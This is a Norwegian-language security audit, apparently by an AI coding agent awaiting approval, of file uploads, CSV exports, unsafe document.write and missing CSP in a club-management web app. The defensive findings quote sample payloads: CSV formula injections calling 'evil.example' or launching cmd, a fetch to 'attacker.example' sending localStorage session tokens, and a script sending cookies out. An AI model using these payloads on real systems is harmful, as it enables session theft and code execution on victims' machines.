# Filopplasting og eksport — sikkerhetsaudit

**Status:** FASE 1 — kartlegging. Ingen fiks gjort. Venter på beslutninger før fase 2.
**Dato:** 2026-04-12
**Kontekst:** Systematisk gjennomgang av filopplasting, fil-eksport, `dangerouslySetInnerHTML`/`innerHTML`/`document.write`/`eval` og CSP-headers før RLS-runden fortsetter.

---

## TL;DR — hovedfunn

| # | Funn | Alvor |
|---|---|---|
| U1 | `CreateListingPage.tsx` aksepterer SVG som "image" → stored XSS via `<img src={base64-svg}>` | **KRITISK** |
| U2 | `KioskAdmin.tsx:170` bruker `document.write` med uescapet `clubName` fra state → reflektert/stored XSS i print-vinduet | **KRITISK** |
| X1 | `ManageFamilies.tsx:548` — CSV-eksport uten formula-injection-escape. Familie/forelder/barn-navn er angrepsvektor | **KRITISK** |
| X2 | `LotteryAdmin.tsx:366` — CSV-eksport av `lottery_sales` uten escape. `buyer_name` (anon shop!) er perfekt angrepsvektor | **KRITISK** |
| X3 | `SalesCampaignPage.tsx:101` — CSV-eksport uten escape. `sellerName` og `campaign.title` | **KRITISK** |
| C1 | **Ingen CSP-header** noe sted (ingen `netlify.toml`-headers, ingen `_headers`, ingen `<meta http-equiv="Content-Security-Policy">`) | **KRITISK forsvarlig lag** |
| U3 | `ImportFamilies.tsx` — ingen størrelsesgrense på Excel-parsing → DoS (client-side) | HØY |
| U4 | `SponsorAdmin.tsx:199` — `logo_url` er fritekst, brukes sannsynligvis i `<img>` uten validering | MEDIUM |
| U5 | Ingen Supabase Storage-bucket brukes i det hele tatt — alt går via base64/localStorage eller rå URL | MEDIUM (design) |

---

## A. Filopplastings-inventar

**Fullstendig liste over alle `<input type="file">` og fil-håndterings-steder i src/.**

### A1 — Marketplace listing-bilde (KRITISK)

- **Fil:** `src/components/marketplace/CreateListingPage.tsx:18–34, 144–150`
- **Rolle:** Koordinator (bak `CoordinatorLayout`-ruten `/marketplace/create`)
- **Accept-attributt:** `accept="image/*"` — **inkluderer `image/svg+xml`**
- **`File.type`-sjekk:** ingen
- **Filextension-sjekk:** ingen
- **Størrelsesgrense:** `file.size > 2 * 1024 * 1024` (2 MB) — klient-side, kan omgås
- **Hvor lagres fila:** **base64 data URL i `localStorage['dugnad_marketplace']`** — ikke Supabase Storage, ikke DB
- **Filnavn-sanitisering:** ikke relevant (base64, ikke filnavn)
- **SVG eksplisitt tillatt/blokkert:** **silent accepted** — `accept="image/*"` matcher SVG
- **Rendering:** `<img src={imagePreview}>` (linje 135) — `<img>` **utfører ikke script i SVG**, så direkte XSS via img-tag er ikke mulig. MEN: marketplace-listings rendres sannsynligvis også et annet sted (liste/detalj-side) — hvis det noen gang blir brukt som `<object>`, `<embed>`, `<iframe src>`, `background: url()` eller direkte navigering til data-URL, blir SVG executable. Dessuten kan SVG stjele annen innebygd content via `<foreignObject>` + CSS.
- **Ekstra:** "aksepter image/*" er klient-side hint, kan trivielt omgås i DevTools → server-side validering må til uansett.

**Risiko:** Stored XSS hvis SVG noen gang nås via annet enn `<img>`-tag, eller hvis `<img>` render-konteksten endres senere. Uansett galt: brukerkontrollert data-URL lagres i localStorage som effektivt blir "persistent" på tvers av sesjoner.

### A2 — Familie-import (Excel/CSV) (HØY)

- **Fil:** `src/components/coordinator/ImportFamilies.tsx:29–80, 298–303`
- **Rolle:** Koordinator
- **Accept:** `.xlsx,.xls,.csv`
- **`File.type`-sjekk:** ingen
- **Ekstensjons-sjekk:** kun via `accept`-attributtet (klient-side hint)
- **Størrelsesgrense:** **INGEN**
- **Hvor lagres fila:** ikke lagres — parses med `XLSX.read(data, { type: 'binary' })` og data inserts i `families` + `family_members`
- **Filnavn:** brukes ikke — kun innholdet
- **Risiko:**
  - **DoS via store Excel-filer:** en 500 MB-fil med millioner av tomme rader vil henge klient-prosessen og kan fylle Supabase-raden-quota.
  - **XLSX-bibliotekets angrepsflate:** historisk har `sheetjs/xlsx` hatt XXE og prototype-pollution-issues. Må sjekke at versjonen er oppdatert (ikke gjort i denne fasen).
  - **Data-injection:** feltene går rett inn i DB via `families.insert({name})` etc. Supabase er parameterisert så ingen SQL-injection, men når disse navnene senere eksporteres til CSV uten escape → se X1/X2/X3 nedenfor. **Upload + export kobles til full CSV-injection-kjede.**

### A3 — Sponsor logo (MEDIUM)

- **Fil:** `src/components/sponsors/SponsorAdmin.tsx:199`
- **Rolle:** Koordinator
- **Type:** **URL-input** (fritekst), ikke fil-opplasting
- **Validering:** ingen — ren `<input value={form.logo_url}>`
- **Lagres:** `sponsors.logo_url` (DB-tekst)
- **Rendering:** sannsynligvis `<img src={sponsor.logo_url}>` på `SponsorPage` — ikke verifisert i detalj, men `<img src>` mot vilkårlig URL eksponerer brukerens IP til tredjepart + laster potensielt trackingpiksler.
- **SVG:** ingen blokkering. En ekstern SVG-URL som tjener `Content-Type: image/svg+xml` rendres som statisk bilde i `<img>`. Ikke direkte XSS, men phishing-risiko: ondsinnet logo kan ligne på en betalingsknapp.

### A4 — ClubCreationPage (INGEN RISIKO)

- **Fil:** `src/components/onboarding/ClubCreationPage.tsx:36, 73`
- **Funn:** `logoUrl`-variabelen er deklarert men aldri satt. Lagres som `null`. Ikke en aktiv opplastingsvei.

### A5 — Ingen Supabase Storage-opplastinger i hele kodebasen

Søk etter `supabase.storage.from`, `.upload(`, `FormData` ga **null treff** for ekte fil-opplasting. Hele appen bruker enten base64-i-localStorage eller ren URL-input. Det betyr også at **ingen Storage-buckets er konfigurert**, så punkt C i oppdraget er trivielt: det finnes ingen buckets å RLS'e.

---

## B. Fil-eksport-inventar (CSV-injection-risiko)

Alle tre eksporter bruker **ren string-konkatenering** med semikolon, UTF-8 BOM, ingen escape av formula-tegn.

### X1 — `ManageFamilies.tsx:548–567` — CSV-eksport av familieliste (KRITISK)

- **Felter:** `Spillernavn;Familienavn;Foresatte;Telefon;E-post;Gruppe;Poeng`
- **Angrepsvektorer:** child name, family name, parent names, parent phones, parent emails — **alle** brukerkontrollerte
- **Escape:** ingen
- **Bibliotek:** ingen (manuell `.join(';')`)
- **CSV-injection:** **YES**. En forelder (eller en anon som injiserer via JoinPage eller Excel-import-flyten) setter barnets navn til `=HYPERLINK("http://evil.example/?x="&A1,"Click")` eller `=cmd|'/c calc'!A1`. Når koordinator eksporterer og åpner i Excel, eksekveres formelen.
- **Spesielt farlig fordi:** eksporten er ment å leses av koordinatoren — dvs. høy-privilegium-bruker — og kjøres på koordinatorens Windows-maskin.

### X2 — `LotteryAdmin.tsx:366–374` — CSV-eksport av lodd-salg (KRITISK, VERST)

- **Felter:** `Navn;Telefon;Antall lodd;Beløp;Vinner`
- **Hvor kommer Navn fra:** `lottery_sales.buyer_name` — **satt via den anonyme `LotteryShop.tsx`-flyten** (Vipps deep link, ingen auth)
- **Escape:** ingen
- **CSV-injection:** **YES, og dette er den verste varianten vi har.**
  - **Hvem som helst** på internett som har en lotteri-URL kan legge inn kjøpsdata med `buyer_name = '=cmd|...'!A0`.
  - Koordinator eksporterer for å sjekke vinnere → åpner i Excel → formelen kjøres på koordinatorens maskin.
  - Ingen auth, ingen rate-limit, ingen validering på input. Dette er en **remote code execution-kjede** fra anon → koordinator-desktop, gated kun av "koordinator åpner CSV i Excel".
- **Bonus:** `wonPrize` (prize name) er også user input (koordinator), og filnavnet `${lottery.name}.csv` er også user-input → filnavns-injection-risiko (sti-traversal, Windows-reserverte navn).

### X3 — `SalesCampaignPage.tsx:101–107` — CSV-eksport av kampanje-salg (KRITISK)

- **Felter:** `Familie;Antall;Beløp;Status`
- **sellerName** stammer fra `families.name` / `family_members.name` — som kan være satt både av koordinator, av import-flyten, av JoinPage, og (indirekte) via anon `CampaignShop`-opprettelse
- **Escape:** ingen
- **CSV-injection:** **YES**. Samme kjede som X1/X2, men med en litt smalere angrepsvektor (forelder må allerede være opprettet).
- **Filnavn-injection:** `campaign.title` i filnavnet, ingen sanitisering.

### Ingen Excel/PDF/JSON-eksport

Søk etter `xlsx`, `exceljs`, `jspdf`, `pdfmake`, `html2canvas`, `JSON.stringify` + blob, `download=` på `<a>` ga **null treff for eksport** (xlsx brukes kun for import). Alle eksporter er CSV. Ingen ekstra rapport-formater å sikre.

---

## C. Supabase Storage-konfigurasjon

**Utgangspunkt:** Ingen kode i `src/` refererer til `supabase.storage`. Det finnes ingen Storage-upload-flows.

**Betyr at:**
- Vi trenger ikke å auditere buckets, RLS på `storage.objects`, file size limits på bucket-nivå eller MIME allowlists — det er ingenting å auditere.
- **Design-observasjon:** Marketplace-bilder som base64 i localStorage er en tikkende bombe:
  - 5–10 MB localStorage-grense per origin i de fleste browsere → få bilder fyller opp kvoten → hele appen crashes med QuotaExceededError
  - Ingen deling mellom brukere (bildene er lokale på hver enhet)
  - Ingen mulighet for server-side validering eller stripping av EXIF/metadata
- **Anbefaling for senere:** migrer til en faktisk `marketplace` Supabase Storage-bucket med MIME allowlist `image/jpeg, image/png, image/webp` (ikke svg), file size limit, RLS policy som kun lar koordinatorer i samme team skrive, og `transform`-støtte for auto-resize. Dette er ikke en del av "steg 0.7", det er en designendring.

---

## D. Content-Security-Policy

**Resultat:** **Null CSP-konfigurasjon noe sted i repoet.**

Sjekket:
- `netlify.toml` — kun build-kommando og SPA-redirect. **Ingen `[[headers]]`-blokk.**
- `public/_headers` — **filen finnes ikke** (bare `public/_redirects` finnes)
- `index.html` — **ingen `<meta http-equiv="Content-Security-Policy">`**
- `vite.config.ts` — ingen plugin som setter headers
- `public/sw.js` — service worker, men setter ikke headers på responses

**Konsekvens:**
- `default-src` er effektivt `*` — alle innebygde scripts, stiler, bilder, iframes, fetch, WebSocket, osv. tillates fra hvor som helst.
- Ingen forsvarsdybde mot XSS: hvis A1 eller U2 lander en XSS-payload, har angriperen fri tilgang til å eksfiltrere Supabase session-tokens via `fetch('https://attacker.example', {body: localStorage.getItem('sb-...')})`.
- Ingen `frame-ancestors` → appen kan iframe'es fra vilkårlig domene (clickjacking mot koordinator-flows som opprett event, slett familie, eksporter CSV).
- Ingen `upgrade-insecure-requests` eller `block-all-mixed-content`.

**Anbefaling:** Legg til `netlify.toml`-headers-blokk med minimum:
```
[[headers]]
  for = "/*"
  [headers.values]
    Content-Security-Policy = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://*.supabase.co wss://*.supabase.co https://api.qrserver.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
    X-Frame-Options = "DENY"
    X-Content-Type-Options = "nosniff"
    Referrer-Policy = "strict-origin-when-cross-origin"
    Permissions-Policy = "geolocation=(), microphone=(), camera=()"
```
Merknad: `'unsafe-inline'` på style er nødvendig fordi hele appen bruker inline style-objekter. Script må IKKE ha `unsafe-inline`. `api.qrserver.com` er nødvendig for kiosk-QR-koden.

**NB:** CSP må testes i `Content-Security-Policy-Report-Only`-modus først i minimum 24 timer før den aktiveres — ellers kan den knekke produksjon umiddelbart (f.eks. hvis det finnes inline scripts jeg ikke har oppdaget).

---

## E. Søk etter unsafe rendering-mønstre

Søkte etter `dangerouslySetInnerHTML`, `.innerHTML =`, `document.write`, `eval(`, `new Function(`.

### E1 — `KioskAdmin.tsx:170` — `document.write` med uescapet bruker-state (KRITISK, U2)

```js
const printQR = () => {
  const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(kioskUrl)}`;
  const win = window.open('', '_blank');
  if (!win) return;
  win.document.write(`
    <html><head><title>Kiosk QR-kode</title>
    ...
    <h1 style="font-size:36px;margin-bottom:8px">🛒 ${clubName || 'Kiosk'}</h1>
    ...
    <img src="${qrApiUrl}" width="300" height="300" ... />
    <p style="font-size:14px;color:#6b7f70;margin-top:24px">${kioskUrl}</p>
    ...
  `);
  win.document.close();
};
```

**Problemer:**
1. **`clubName` er bruker-kontrollert state** og interpoleres rett inn i HTML uten escape. Hvis en koordinator oppretter en klubb med navnet `<script>fetch('https://evil/?c='+document.cookie)</script>`, kjøres scriptet i det nye vinduet. Nye vinduet åpnes fra `window.open('')` → samme opprinnelse → har tilgang til hoveddokumentets `localStorage` via `window.opener`. Full auth-token-exfil.
2. `kioskUrl` interpoleres også, men den er konstruert fra `window.location.origin + teamId`. `teamId` er fra localStorage og er bruker-kontrollert av koordinator. Kan inneholde `"><script>`.
3. `qrApiUrl` er encodeURIComponent-beskyttet, OK.
4. Angrepsscenario: koordinator A i delt klubb setter `clubName = <img src=x onerror=...>`. Koordinator B i samme klubb printer QR → B sin session-token eksfiltreres.

**Merk:** `KioskAdmin` er bak `CoordinatorLayout`, så angriperen må være koordinator. Men med delte klubber er "en ondsinnet eller kompromittert koordinator" et reelt trusselbilde. Og hvis `clubName` noen gang settes av en ikke-klarert kilde (import, anon flow, bulk-opprettelse), blir det verre.

### E2 — Ingen andre treff

Ingen `dangerouslySetInnerHTML`, ingen andre `.innerHTML =`, ingen `eval(`, ingen `new Function(`. KioskAdmin er eneste forekomst.

---

## Risikograd-oppsummering

### KRITISK (aktiv eller lett eksploaterbar angrepsflate)

| ID | Kort | Angrepsvei | Skade |
|---|---|---|---|
| U1 | Marketplace SVG via `accept="image/*"` | Koordinator laster opp SVG med `<script>` | Stored XSS hvis SVG noen gang rendres utenfor `<img>` (marketplace-liste, detalj-side) |
| U2 | `KioskAdmin` `document.write(clubName)` | Rogue/kompromittert koordinator setter `<script>` i klubbnavn | XSS + session-token-eksfil i print-vinduet via `window.opener.localStorage` |
| X1 | `ManageFamilies` CSV-eksport | Familie/forelder-navn med `=cmd\|...` | RCE på koordinator-desktop når CSV åpnes i Excel |
| X2 | `LotteryAdmin` CSV-eksport av **anon** `buyer_name` | Hvem som helst på internett med lotteri-URL | RCE på koordinator-desktop. **Dette er den verste kjeden vi har**: anon → koordinator-maskin. |
| X3 | `SalesCampaignPage` CSV-eksport | seller/family/campaign name med formel | RCE på koordinator-desktop |
| C1 | Ingen CSP | Alle XSS-payloads får fri eksfiltrasjon | Multiplikator på alle ovennevnte |

### HØY

| ID | Kort | Skade |
|---|---|---|
| U3 | `ImportFamilies` ingen størrelsesgrense på Excel | Klient-side DoS, evt. quota-fylling i DB |

### MEDIUM

| ID | Kort | Skade |
|---|---|---|
| U4 | Sponsor `logo_url` er fritekst, ingen validering | IP-eksfil til tredjepart, phishing, ingen direkte XSS (brukes i `<img>`) |
| U5 | Hele bilde-pipelinen går via base64/localStorage | Quota-fylling, ingen deling mellom enheter, ingen server-side validering — designfeil, ikke aktiv sårbarhet |

### LAV

Ingen rent kosmetiske funn å rapportere. Alt som er verdt å fikse har minst MEDIUM-grad.

---

## Forslag til steg 0.7 (før RLS fase 2)

**Blødnings-stopp (egne PR-er, i denne rekkefølgen):**

1. **CSV-injection-escape** — én helper `csvCell(value)` som prefikser med `'` hvis cellen starter med `= + - @ \t \r`, og alltid double-quote-wrapper cellen hvis den inneholder `; " \n \r`. Bruk i alle tre CSV-eksporter (X1, X2, X3). 1 fil, ~20 linjer. **Fixer KRITISK × 3.**
2. **SVG-blokk i marketplace** — legg til eksplisitt `file.type` allowlist (`image/jpeg|png|webp|gif`) og reject `svg`. 1 fil, ~5 linjer. **Fixer KRITISK U1.**
3. **`KioskAdmin` printQR escape** — bruk `textContent`/DOM-manipulasjon i stedet for `document.write`-templating, eller HTML-escape `clubName` og `kioskUrl`. 1 fil, ~20 linjer. **Fixer KRITISK U2.**
4. **CSP-header** — `netlify.toml` med CSP i `Report-Only`-modus først. 1 fil, ~15 linjer. **Fixer C1 (forsvarsdybde for alt annet).**

**Kan vente (inkluder i RLS-runden eller senere):**
- U3 størrelsesgrense på Excel-import
- U4 sponsor logo URL-validering
- U5 migrering til Supabase Storage for bilder

**Minste meningsfulle steg 0.7:** punktene 1, 2, 3 bør gå ut på main samme dag. CSP i Report-Only kan følge ettpå siden den trenger observasjons-tid.

---

## Hva jeg trenger fra deg før fase 2 av dette

1. **Godkjenner du rekkefølgen 1→2→3→4 som fire separate commits?** Eller vil du ha dem samlet i én "security: fix XSS and CSV injection vectors"-commit?
2. **CSV-injection-fix: jeg foreslår at vi også endrer BOM + semikolon til ren RFC 4180 (komma + quoting)** samtidig. Fordelen: Excel i norsk locale er finicky med semikolon, og kvoting blir mer konsistent. Ulempen: dagens eksport-brukere som har makroer/workflows bygget på semikolon-formatet må oppdatere. **Si fra om du vil beholde semikolon-formatet eller endre.**
3. **CSP i Report-Only først, eller rett på "enforce"?** Anbefalingen min er Report-Only i 24–48t mot dev/staging, så enforce. Du får fint `report-uri` hvis vi setter opp en liten edge-funksjon, ellers kan du se brudd i browser-console.
4. **Er det OK at KioskAdmin print-QR bytter fra `document.write` til ren DOM-manipulasjon?** Dette endrer atferden til at `window.print()`-knappen må `addEventListener` i stedet for inline `onclick`. Ingen brukersynlig forskjell.
5. **U5 (Supabase Storage-migrering for marketplace-bilder)** — ønsker du at jeg legger denne inn i RLS-testplanen som eget senere-steg, eller skal den leve i en separat "backlog"-liste?

Ingen fiks gjort, ingen commits, ingen push. Venter på svar.
